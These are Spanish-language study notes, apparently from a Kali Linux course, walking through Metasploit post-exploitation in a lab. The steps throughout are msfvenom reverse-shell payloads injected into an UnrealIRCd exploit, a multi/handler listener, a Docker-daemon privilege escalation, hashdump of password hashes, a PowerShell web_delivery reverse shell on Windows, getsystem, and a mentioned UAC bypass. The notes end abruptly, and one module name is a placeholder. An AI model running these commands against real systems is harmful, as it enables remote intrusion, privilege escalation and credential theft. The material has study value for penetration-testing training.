# 04 KALI - Post-explotación

## Meterpreter para post-explotación

- Los módulos de explotación están en  /usr/share/metasploit-framework/modules/post
- Aqui vemos que hay módulos de post explotación para varios sistemas y aplicaciones
- Para establecer un meterpreter vamos a tener que explotar algunas de las vulnerabilidades del sistema
- Veamos primero con Ubuntu
- desde mi kali busco por la vulnerabilidad unrealirc

> msf> search unrealirc
> msf> use unreal/....
- Si entro en el exploit de irc_unreal y le pongo show payloads ninguno es un meterpreter, son cmds
- back para salir
- Creo un payload con msfvenom, le paso mi ip

> msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.16.128  lport=444

- Me devuelve en pantalla mi payload (todo lo que hay después de exec)
- Lo copio 
- Busco el exploit de unreal que ya tenia de antes y copio el código salvando las comillas simples con \ antes de la comillas simples
- Al principio debo colocar f'python -c"exec(...)
- Pongo a la escucha un handler

> msf> use exploit/multi/handler
> msf> show options
> msf> set lhost mi_IP
> msf> set lport 444
> msf> exploit

- Se queda a la escucha
- En otra consola, desde el path donde tengo el exploit lo lanzo a mi ip objetivo

> ./exploit.py 192.168.1.133 -payload python

- Se ha abierto la sesión meterpreter
- Hay que saber que tipo de usuario soy, user normal, admin, que privilegios tengo

> getuid

- En los módulos de post explotación en /post/linux/gather
- Tengo un modulo que es para ver si está corriendo en una máquina virtual
- Desde meterpreter

> meterpreter> run /post/linux/gather/checkvm

- Puedo tratar de hacer un dump de todos los hashes
> meterpreter> run /post/linux/gather/hashdump

- No tengo privilegios para hacerlo
- Puedo usar exploits locales para escalar privilegios
- Mando a un segundo plano el meterpreter

> meterpreter> background

- Puedo ver mis sesiones con sessions

> msf> session

- Puedo buscar con un sugeridor de exploits
> msf> use post/multi/recon/local_exploit_suggester
msf post(multi)> show options

- Lo que recibe es una sesión activa  

> msf post(multi) set session 1
> msf post(multi) exploit

- Hay un exploit para docker que si funciona

> msf> search doker_daemon
> msf> use 1 (docker daemon scalate privileges)
> msf> show options

- Es un exploit local, por lo que ya debo tener comprometida la máquina (es el caso)
- Me pide la sesión y el payload me pide el lhost y el lport
> msf> set session 1
- Le metemos otro payload que el que lleva

> msf> set payload linux/x86/meterpreter/reverse_tcp
> msf> set lhost MI_IP

- Esto intentará escalar privilegios y devolverme un meterpreter

>msf>exploit

- Esto ejecuta el exploit desde la session 1 que tenia abierta y me abre una session 2 con otro meterpreter

> meterpreter> getuid

- Ahora si puedo usar el hashdump!
-----

## Meterpreter post-explotación windows
 
- Vamos a usar otro módulo de metasploit que se llama web deliver y ejecutar un script manualmente desde windows para que nos devuelva unsa shell reversa
- Windows tiene la IP .137 
- En metasploit

> msf> use exploit/multi/script/web_delivery
> msf> show options

- me pide el payload, el lhost...nos generará el payload automáticamente que deberé ejecutar en la máquina destino

> msf> show targets
> msf> set target powershell
> msf> set payload windows/x64/meterpreter/reverse_tcp
> msf> set lhost IP_KALI
> exploit

- Me genera el payload en pantalla y me dice de ejcitarlo en la máquina objetivo para obtener una shell reversa
- Podría generar un ejecutable camuflado
- No hace falta configurar un listener
- Ejecuto el código en la powershell de windows
- me abre un meterpreter

> msf> session 1
> meterpreter> getuid
> meterpreter> getsystem -h (intentará subir privilegios)
- Voy a los modulos de post /usr/share/metasploit-framework/modules/post/windows
- Porque es util saber si es una máquina virtual? Puede ser un Honey Pot (trampa)

> run /post/windows/gather/hashdump

- Para conseguir permisos de admin mando esta sesión a background

> meterpreter> background

- Puedo hacer que metsploit me sugiera exploits
> msf> use post/multi/recon/local_exploit_suggester
> msf> set session 1
> msf> exploit

- A ver si asi averiguamos como podemos escalar privilegios
- Sugiere uac_bypass
> msf(local_exploit_suggester)> back
> msf> use uac/kñklñk
> msf(uac)> show options

- El uac de windows es el popup cuando pregunta si permites darle permisos a la shell para hacer cambios en el equipo
- El bypass nos permite saltarnos este uac
etc... luego lo vemos!
-----

## Elevación de privilegios UAC